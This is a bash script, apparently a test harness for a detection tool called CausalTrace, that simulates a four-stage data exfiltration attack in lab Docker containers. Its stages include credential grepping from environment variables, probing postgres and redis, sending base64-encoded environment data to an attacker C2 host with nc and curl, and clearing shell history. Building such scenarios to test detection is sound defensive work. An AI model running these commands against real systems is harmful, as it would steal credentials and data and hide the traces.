#!/bin/bash
# data_exfil_attack.sh — Data exfiltration via compromised service
#
# Attack scenario: An attacker compromises the product-service and uses it
# to exfiltrate data from the database to an external C2 server. This is a
# classic "insider threat" or "supply chain" scenario where:
#   1. product-service reads MORE data from postgres than normal
#   2. product-service connects to attacker C2 (never seen before)
#   3. Data is transferred out via the novel connection
#
# CausalTrace detects this via:
#   - Sheaf anomaly: product→postgres edge energy spikes (unusual query volume)
#   - Novel-edge: product-service → attacker:4444 (C2 callback)
#   - Behavior bits: compound BIT_SENSITIVE_FILE + BIT_LATERAL_CONNECT
#   - Eigenmode analysis: energy concentrated in product↔postgres mode
#
# Why Falco/Tetragon miss this:
#   - product-service talking to postgres is NORMAL (calibrated edge)
#   - The VOLUME of queries is the anomaly, not the queries themselves
#   - Outbound connect to C2 is just connect() — normal syscall
#   - Data transfer is just write() on a socket — normal syscall
#   - Requires sheaf spectral analysis to detect the energy spike

LOG_DIR="${1:-results/run_latest/production_detection}"
mkdir -p "$LOG_DIR"

echo "============================================================"
echo "  Data Exfiltration Attack — 4 Stages"
echo "  $(date)"
echo "============================================================"

# ── STAGE 1: Reconnaissance — enumerate database ────────────────
echo ""
echo "[STAGE 1] $(date +%s%N) — Recon: product-service enumerates postgres"
echo "  Compromised service reads table structure and row counts"

STAGE1_START=$(date +%s%N)
docker exec ct-prod-product bash -c '
    # Normal: product-service connects to postgres for queries
    # Anomalous: enumeration queries (table list, schema dump)
    for i in $(seq 1 10); do
        nc -w1 172.22.0.21 5432 2>/dev/null < /dev/null || true
    done
    # Read environment for DB credentials
    env | grep -i "DB\|POSTGRES\|PASS" 2>/dev/null || true
' > "$LOG_DIR/exfil_stage1.log" 2>&1
STAGE1_END=$(date +%s%N)

echo "  Latency: $(( (STAGE1_END - STAGE1_START) / 1000000 )) ms"
echo "  Expected: Edge energy spike on product→postgres (10x normal rate)"

sleep 3

# ── STAGE 2: Data harvest — bulk read from DB ───────────────────
echo ""
echo "[STAGE 2] $(date +%s%N) — Harvest: bulk database read"
echo "  Compromised service reads all customer/payment data"

STAGE2_START=$(date +%s%N)
docker exec ct-prod-product bash -c '
    # Simulate bulk DB queries (30 rapid connections = anomalous burst)
    for i in $(seq 1 30); do
        nc -w1 172.22.0.21 5432 2>/dev/null < /dev/null || true
    done
    # Also probe redis for cached data
    printf "KEYS *\r\n" | nc -w1 172.22.0.20 6379 2>/dev/null || true
' > "$LOG_DIR/exfil_stage2.log" 2>&1
STAGE2_END=$(date +%s%N)

echo "  Latency: $(( (STAGE2_END - STAGE2_START) / 1000000 )) ms"
echo "  Expected: Sheaf anomaly (Rayleigh spike on product↔postgres edge)"

sleep 3

# ── STAGE 3: C2 callback — establish exfiltration channel ───────
echo ""
echo "[STAGE 3] $(date +%s%N) — C2: product-service → attacker (exfil channel)"
echo "  Compromised service connects to attacker C2 to send harvested data"

STAGE3_START=$(date +%s%N)
docker exec ct-prod-product bash -c '
    # Connect to attacker C2 server
    echo "EXFIL_DATA: $(env | base64 | head -c 200)" | nc -w3 172.22.0.25 4444 2>/dev/null || true
    # Second channel via attacker HTTP
    curl -s -X POST -d "data=$(env | base64 | head -c 200)" http://172.22.0.25:8888/ 2>/dev/null || true
' > "$LOG_DIR/exfil_stage3.log" 2>&1
STAGE3_END=$(date +%s%N)

echo "  Latency: $(( (STAGE3_END - STAGE3_START) / 1000000 )) ms"
echo "  Expected: Novel-edge (product → attacker:4444, product → attacker:8888)"

sleep 3

# ── STAGE 4: Cover tracks — clean up ────────────────────────────
echo ""
echo "[STAGE 4] $(date +%s%N) — Cover tracks: clean logs and temp files"
echo "  Attacker attempts to remove evidence"

STAGE4_START=$(date +%s%N)
docker exec ct-prod-product bash -c '
    # Attempt to clear bash history and temp files
    > /tmp/.exfil_buffer 2>/dev/null || true
    history -c 2>/dev/null || true
    # Read /proc/self/environ one more time
    cat /proc/self/environ 2>/dev/null | tr "\0" "\n" > /dev/null || true
' > "$LOG_DIR/exfil_stage4.log" 2>&1
STAGE4_END=$(date +%s%N)

echo "  Latency: $(( (STAGE4_END - STAGE4_START) / 1000000 )) ms"
echo "  Expected: BIT_SENSITIVE_FILE (/proc/self/environ)"

echo ""
echo "============================================================"
echo "  DATA EXFILTRATION ATTACK COMPLETE — $(date)"
echo "============================================================"
echo ""
echo "Summary:"
echo "  Stages: 4 (recon, harvest, exfil, cover)"
echo "  Attack class: Data exfiltration / Insider threat"
echo "  MITRE ATT&CK: T1041 (Exfil Over C2), T1048 (Exfil Over Alt Protocol)"
echo "  Novel edges: product→attacker:4444, product→attacker:8888"
echo "  Calibrated edge anomaly: product→postgres energy spike (30x burst)"
echo "  Behavior bits: BIT_SENSITIVE_FILE, BIT_LATERAL_CONNECT"
echo ""
echo "Why traditional tools miss this:"
echo "  - product-service → postgres is a LEGITIMATE connection"
echo "  - The anomaly is in the VOLUME and PATTERN, not the connection itself"
echo "  - Outbound to C2 is just another TCP connection"
echo "  - Only sheaf spectral analysis detects the energy spike on the edge"
echo "  - Eigenmode fingerprint shows energy concentrated in product↔postgres mode"
